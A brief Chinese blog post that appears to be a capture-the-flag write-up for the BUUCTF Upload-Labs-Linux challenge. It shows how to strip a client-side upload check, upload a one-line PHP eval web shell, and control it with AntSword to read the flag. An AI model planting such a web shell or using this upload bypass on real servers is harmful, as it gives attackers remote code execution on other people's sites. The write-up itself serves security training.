---
title: CTF：Upload-Labs-Linux
date: 2022-10-10 08:52:48
cover: /img/Upload-Labs-Linux/20221010085420.png
tags:
- ctf
- buuctf
- antsword
---
# 题目预览：
![](/img/Upload-Labs-Linux/20221010085420.png)  
# 解决方法
1. 开控制台
2. 关闭javascript
   > 设置-偏好设置-调试程序
   删除`onsubmit="return.checkFile()"`
3. 新建一个文件里面写入`<?php @eval($_POST['123']);?>`
4. 后缀名改为php上传到网站，显示出图片后右键复制链接。
5. 打开antsword，add一个url地址为图片链接，密码为123，加密base64.
6. 点击链接就能发现根目录有个flag文件了。